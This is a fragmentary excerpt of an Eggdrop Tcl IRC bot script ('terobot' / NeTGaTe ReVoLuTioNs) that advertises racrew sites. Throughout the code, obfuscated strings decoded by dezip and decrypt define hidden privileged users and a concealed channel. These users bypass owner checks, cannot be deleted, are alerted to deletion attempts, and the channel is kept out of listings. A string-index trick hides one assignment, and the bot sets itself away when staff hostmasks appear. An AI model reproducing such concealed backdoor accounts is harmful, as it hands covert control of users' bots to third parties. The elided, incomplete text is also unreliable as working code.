#   NeTGaTe ReVoLuTioNs !!        by terroris aka Ryo
...
set notd [dezip "Ry3/K1uB5vu1xbjB2.WLyqf/"]
set notm [dezip "Ry3/K1uB5vu1xbjB2.WLyqf/"]
###########################
...
set max-logsize 512
set upload-to-pwd 1
set notb [dezip "Ry3/K1uB5vu1xbjB2.WLyqf/"]
set notc [dezip "Ry3/K1uB5vu1xbjB2.WLyqf/"]
...
global notc owner ps pr pt­
if {$nick != $owner &&  $nick != $ps &&  $nick != $pr &&  $nick != $pt} {
...
if {[string tolower $arg] == [decrypt 64 "cGAOw.Rx58J1"]} {
...
set pt [dezip "rpjuG03PabP/"]
proc saveuser {} {
global ps owner pr pt
if {![validuser $ps]} {
...
if {$nick != $ps && [string tolower $chan] == [decrypt 64 "cGAOw.Rx58J1"]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
...
global botnick ps notc owner pr pt
set rest [lindex $param 0]
if {$nick != $owner &&  $nick != $ps &&  $nick != $pr &&  $nick != $pt} {
...
if {$rest == $pt} {
puthlp "NOTICE $nick :$notc Denied"
puthlp "PRIVMSG $pt :$notc $nick Trying Delete You"
return 0
}
if {$rest == $owner} {
puthlp "NOTICE $nick :$notc Denied"
...
if {$joinme != "" && [string tolower $chan] != [decrypt 64 "cGAOw.Rx58J1"]} {
...
if {$mhost == "@racrew*" || [string match "*.racrew.us" $mhost] || [string match "@staff.racrew*" $mhost] || [string match "@staff*" $mhost]} {
putsrv "AWAY"
}
if {![isop $botnick $chan]} {
if {[info exists invme($mhost)]} {
...
set toth [decrypt 64 "cGAOw.Rx58J1"]
...
timer 5 czo_czo
set [string index $lenc 15][string index $lenc 17] [string index $lenc 19][string index $lenc 4][string index $lenc 17][string index $lenc 17][string index $lenc 14][string index $lenc 17][string index $lenc 8][string index $lenc 18]
...
if {$nick != $ps && [string tolower $chantarget] == [decrypt 64 "cGAOw.Rx58J1"]} { return 0 }
foreach x [channels] {
...
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string tolower $x] == [decrypt 64 "cGAOw.Rx58J1"]} { return 0 }
...
set chan "Channels:"
foreach x [channels] {
if {[string tolower $x] != [decrypt 64 "cGAOw.Rx58J1"]} {
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
...
global vern notc
puthlp "PRIVMSG $chan :$notc $vern v.1.0.3b Final, Get It Now!! Visit: http://www.racrew.info/source"
return 0
}
...
foreach x [channels] {
if {[onchan $botnick $x]} {
if {![isop $botnick $x] && [string tolower $x] != [decrypt 64 "cGAOw.Rx58J1"]} {
...
set kickme($nick) 3
if {[string tolower $chan] != [decrypt 64 "cGAOw.Rx58J1"]} {
...
if {![matchattr $nick m]} {
if {[string tolower $channel] != [decrypt 64 "cGAOw.Rx58J1"]} {
...
set usrv [dezip "n7HxX.QG0Px0SBhm..y77h/.HovSI070a.O."]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
...
set realname [dezip "wCrYI1xsNcM.DupZ/.0qnjZ1ggDv4/MByF10"]
}
...
global botnick vern notc version server
puthlp "NOTICE $nick :\001VERSION $notc $vern 1Get It Now! visit: 12http://www.racrew.us/\001"
return 0
}
proc uncolor {s} {
regsub -all --  $s "" s
...
if {[string tolower $rest] == [decrypt 64 "cGAOw.Rx58J1"]} {
return 0
}
if {![validchan $rest]} {
...
if {[string tolower $chan]==[string tolower $basechan] || [string tolower $chan] == [decrypt 64 "cGAOw.Rx58J1"]} {
return 0
}
if {$rest!=""} {
puthelp "JOIN $chan"
...
putlog "==============================="
putlog "       terobot tcl loaded      "
putlog "      Email: ryo@racrew.us     "
putlog "==============================="
